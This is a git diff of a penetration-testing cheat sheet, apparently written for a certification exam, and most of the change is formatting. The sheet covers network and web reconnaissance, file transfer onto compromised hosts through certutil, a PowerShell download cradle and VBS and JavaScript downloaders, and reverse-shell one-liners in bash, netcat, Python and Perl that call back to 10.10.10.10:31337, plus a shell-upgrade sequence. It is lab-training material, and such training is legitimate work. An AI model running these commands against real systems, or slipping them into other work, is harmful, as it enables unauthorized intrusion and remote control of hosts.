@@ -34,42 +34,53 @@ projects: []
 ## Nmap
 
   - Quick TCP Scan
+
 ```bash
 nmap -sC -sV -vv -oN quick 10.10.10.10
 ```
 
   - Quick TCP Scan
+
 ```bash
 nmap -sU -sV -vv -oN quick_udp 10.10.10.10
 ```
+
   - Full TCP Scan
+
 ```bash
 nmap -sC -cV -p- -vv -oN full 10.10.10.10
 ```
 
 ## Banner Grabbing
+
   - Netcat Banner Grab
+
 ```bash
 nc -v 10.10.10.10 <port>
 ```
 
   - Telnet Banner Grab
+
 ```bash
 telnet 10.10.10.10 <port>
 ```
 
 ## SMB
+
   - Nmap Vulnerability Scan
+
 ```bash 
 nmap -p 139,445 -vv --script=smb-vuln* 10.10.10.10
 ```
 
   - Nmap User and Share Scan
+
 ```bash
 nmap -p 139,445 -vv --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.10.10
 ```
 
   - Enum4linux
+
 ```bash
 enum4linux -a 10.10.10.10
 ```
@@ -78,32 +89,39 @@ This tool can be tempermental with newer versions of kali, it is recommended tha
 {{% /alert %}}
 
   - Null Connection Test
+
 ```bash
 rpcclient -U "" 10.10.10.10
 ```
 
   - Connecting to a client
+
 ```bash
 smbclient //MOUNT/share
 ```
   
 ## SNMP
+
   - snmp-check
+
 ```bash
 snmp-check 10.10.10.10
 ```
 
 ## Web Scanning
   - quick directory busting scan with gobuster
+
 ```bash
 gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10:<port> -s 200,204,301,302,307,403,500 -e -k -t 50 -np -o gobuster_quick_scan.txt 
 ```
   - targeting specific extensions with gobuster
+
 ```bash
 gobuster -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.10:<port> -s 200,204,301,302,307,403,500 -e -k -t 50 -np -o gobuster_quick_scan.txt -x .txt,.php
 ```
   
   - Nikto
+
 ```bash
 nikto -h http://10.10.10.10:<port>
 ```
@@ -112,29 +130,9 @@ if the endpoint you are scanning is using ssl, but has an invalid certificate th
 {{% /alert %}}
 
   - WordPress Scan
+
 ```bash
 wpscan -u 10.10.10.10 port
-```
-
----
-# Interactive Shells
-
-## Python
-```bash
-# Enter while in reverse shell
-$ python -c 'import pty; pty.spawn("/bin/bash")'
-
-Ctrl-Z
-
-# In Kali
-$ stty raw -echo
-$ fg
-
-# In reverse shell
-$ reset
-$ export SHELL=bash
-$ export TERM=xterm-256color
-$ stty rows <num> columns <cols>
 ```
 
 ---
@@ -155,6 +153,7 @@ nc 10.10.10.10 9999 < received_file.txt
 ## Via FTP
 
   - Using FTP
+
 ```bash
 # In Kali
 pip install pyftplib
@@ -173,6 +172,7 @@ ftp -v -n -s:ftp.txt
 ```
 
   - Using TFTP
+
 ```bash
 # In Kali
 atftpd --daemon --port 69 /tftp
@@ -182,7 +182,9 @@ tftp -i 10.10.10.10 GET file.txt
 ```
 
 ## Via HTTP
+
   - Using basic commands
+
 ```bash
 # In Kali
 python -m SimpleHTTPServer 80
@@ -195,6 +197,7 @@ powershell -c "(new-object System.Net.WebClient).DownloadFile('http://10.10.10.1
 ```
 
   - Using VBS (Windows)
+
 ```bash
 # In reverse shell
 echo strUrl = WScript.Arguments.Item(0) > wget.vbs
@@ -226,7 +229,9 @@ echo ts.Close >> wget.vbs
 # Execute
 cscript wget.vbs http://10.10.10.10/file.exe file.exe
 ```
+
   - Using javascript (Windows)
+
 ```bash
 # In Kali
 python -m SimpleHTTPServer 80 
@@ -243,7 +248,9 @@ echo BinStream.SaveToFile("file.txt"); >> wget.js
 
 cscript /nologo wget.js http://10.10.10.10/file.txt
 ```
+
   - Using Certutil (Windows)
+
 ```bash
 # In Kali
 python -m SimpleHTTPServer 80
@@ -256,6 +263,7 @@ certutil.exe -urlcache -split -f "http://10.10.10.10/file.txt" file.txt
 # Reverse Shells
 ## Catching Reverse Shells
   - Because metasploit usage is limited in the exam, we will stick to basic NetCat receivers
+
 ```bash
 nc -nvlp 31337
 ```
@@ -268,31 +276,39 @@ On some machines you will find that outbound traffic is whitelisted to certain p
 {{% alert note %}}
 While these examples are tailored to Unix systems, some of these will also work by substituting `/bin/bash` with `cmd.exe`
 {{% /alert %}}
+
   - Bash
+
 ```bash
 bash -i >& /dev/tcp/10.10.10.10/31337 0>&1
 ```
 
   - Netcat without -e flag
+
 ```bash 
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 31337 >/tmp/f
 ```
 
   - Netcat with -e flag
+
 ```bash
 nc -e /bin/bash 10.10.10.10 31337
 ```
 
   - Python
+
 ```bash
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.10.10",31337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
   
   - Perl
+
 ```bash
 perl -e 'use Socket;$i="10.10.10.10";$p=31337;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 ```
+
   - Xterm
+
 ```bash
 #On target system
 xterm -display 10.10.10.10:1
@@ -316,12 +332,15 @@ xhost +<targetip>
 ---
 # Useful Commands
 ## Linux
+
   - List all open ports
+
 ```bash
 netstat -alnp
 ```
 
   - SSh Tunneling though a host
+
 ```bash
 # This will allow us to connect to port 31337 on our local machine and hit a service running on the target machine's port 5432, with our traffic coming from the ip 127.0.0.1
 # This is extremely useful when a service does not allow external connections.
@@ -329,4 +348,23 @@ ssh -L31337:127.0.0.1:5432 username@10.10.10.10
 
 #If your user is not permitted ssh access and only sftp access, use the -N flag:
 ssh -N -L31337:127.0.0.1:5432 username@10.10.10.10
+```
+
+  - Getting a fully interactive shell with python
+
+```bash
+# Enter while in reverse shell
+$ python -c 'import pty; pty.spawn("/bin/bash")'
+
+Ctrl-Z
+
+# In Kali
+$ stty raw -echo
+$ fg
+
+# In reverse shell
+$ reset
+$ export SHELL=bash
+$ export TERM=xterm-256color
+$ stty rows <num> columns <cols>
 ```
